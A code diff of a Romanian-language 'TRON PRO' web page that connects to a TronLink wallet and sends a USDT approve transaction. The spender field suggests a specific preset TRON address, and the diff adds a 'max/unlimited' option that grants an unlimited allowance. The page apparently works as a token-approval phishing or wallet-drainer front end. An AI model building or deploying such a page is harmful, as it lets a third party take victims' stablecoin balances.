@@ -3,45 +3,36 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>TRON PRO - TronLink</title>
-
-<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+<title>TRON PRO dApp</title>
 
 <style>
 body{font-family:system-ui;margin:20px;background:#f7f9fc}
 .card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px}
 input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
 button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
-pre{background:#f3f4f6;padding:10px;border-radius:8px}
-.ok{background:#d1fae5;padding:6px;border-radius:999px;display:inline-block}
-.bad{background:#fee2e2;padding:6px;border-radius:999px;display:inline-block}
-canvas{margin-top:10px}
+.secondary{background:#e5e7eb;color:#111}
+pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
+.status{padding:6px 10px;border-radius:999px;background:#fee2e2;display:inline-block}
+.ok{background:#d1fae5}
 </style>
 </head>
 
 <body>
 
 <div class="card">
-<h2>TRON PRO (TronLink dApp)</h2>
+<h2>TRON PRO dApp (TronLink)</h2>
 
-<div id="status" class="bad">Deconectat</div>
-<p><b id="addr">—</b></p>
+<div id="status" class="status">Deconectat</div>
+<p>Wallet: <b id="addr">—</b></p>
 
-<button onclick="connect()">Connect TronLink</button>
+<button onclick="connect()">Connect Wallet</button>
 </div>
 
 <div class="card">
-<h3>QR dApp</h3>
-<button onclick="genQR()">Generează QR</button>
-<canvas id="qr"></canvas>
-<pre id="link"></pre>
-</div>
+<h3>TRC20 USDT APPROVE</h3>
 
-<div class="card">
-<h3>TRC20 APPROVE (USDT)</h3>
-
-<input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
-<input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
+<input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
+<input id="amount" placeholder="max / unlimited / 10 / 100 etc" />
 
 <button onclick="approve()">Approve</button>
 
@@ -54,91 +45,110 @@ const USDT = "TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
 let addr = null;
 
 /* =========================
-   QR (DOAR LINK SITE)
-========================= */
-function genQR(){
-  const url = "https://d-app-lake-theta.vercel.app";
-  QRCode.toCanvas(document.getElementById("qr"), url);
-  document.getElementById("link").innerText = url;
-}
-
-/* =========================
-   CONNECT TRONLINK (REAL FLOW)
+   CONNECT TRONLINK
 ========================= */
 async function connect(){
 
   if(!window.tronWeb){
-    alert("Instalează TronLink și deschide pagina în Chrome/Brave");
+    alert("Deschide în Chrome/Brave cu TronLink instalat");
     return;
   }
 
   try {
 
-    // force wallet activation popup
     if(window.tronLink && window.tronLink.request){
       await window.tronLink.request({ method: "tron_requestAccounts" });
     }
 
-    let tries = 0;
-    while(tries < 10 && (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58)){
+    let i = 0;
+    while(i < 10 && (!window.tronWeb.defaultAddress?.base58)){
       await new Promise(r => setTimeout(r, 300));
-      tries++;
+      i++;
     }
 
     if(!window.tronWeb.defaultAddress?.base58){
-      alert("Nu s-a conectat wallet-ul");
+      alert("Nu s-a conectat TronLink");
       return;
     }
 
     addr = window.tronWeb.defaultAddress.base58;
 
     document.getElementById("addr").innerText = addr;
-    document.getElementById("status").className = "ok";
-    document.getElementById("status").innerText = "Conectat TronLink";
+    document.getElementById("status").innerText = "Conectat";
+    document.getElementById("status").classList.add("ok");
 
   } catch(e){
     console.log(e);
-    alert("Eroare conectare TronLink");
+    alert("Eroare connect TronLink");
   }
 }
 
 /* =========================
-   CONTRACT
-========================= */
-async function contract(){
-  return await window.tronWeb.contract().at(USDT);
-}
-
-/* =========================
-   APPROVE USDT
+   APPROVE FUNCTION FIXED
 ========================= */
 async function approve(){
 
-  try{
+  try {
+
+    if(!addr){
+      alert("Conectează wallet-ul mai întâi");
+      return;
+    }
 
     const spender = document.getElementById("spender").value;
-    const amount = document.getElementById("amount").value;
+    let amount = document.getElementById("amount").value;
 
     if(!spender || !amount){
       document.getElementById("out").innerText = "Completează câmpurile";
       return;
     }
 
-    const value = BigInt(Math.floor(Number(amount) * 1e6));
+    const UINT256_MAX =
+      (BigInt(1) << BigInt(256)) - BigInt(1);
 
-    const c = await contract();
+    let value;
+
+    amount = amount.toLowerCase().trim();
+
+    // 🔥 MAX / UNLIMITED
+    if(amount === "max" || amount === "unlimited"){
+      value = UINT256_MAX;
+    }
+    else {
+
+      const DECIMALS = 6n;
+
+      amount = amount.replace(",", ".");
+
+      if(/^[0-9]+$/.test(amount)){
+        value = BigInt(amount) * (10n ** DECIMALS);
+      } else {
+        const parts = amount.split(".");
+        const i = parts[0] || "0";
+        const f = (parts[1] || "").padEnd(6, "0").slice(0,6);
+        value = BigInt(i + f);
+      }
+    }
+
+    const contract = await window.tronWeb.contract().at(USDT);
 
     document.getElementById("out").innerText =
       "Așteaptă confirmarea în TronLink...";
 
-    const tx = await c.approve(spender, value.toString()).send();
+    const tx = await contract.approve(
+      spender,
+      value.toString()
+    ).send({
+      feeLimit: 100_000_000
+    });
 
     document.getElementById("out").innerText =
-      "TX trimis:\n" + tx;
+      "SUCCESS TX:\n" + tx;
 
-  }catch(e){
+  } catch(e){
+    console.log(e);
     document.getElementById("out").innerText =
-      "Tranzacție anulată / eroare";
+      "Tranzacție anulată sau eroare";
   }
 }
 
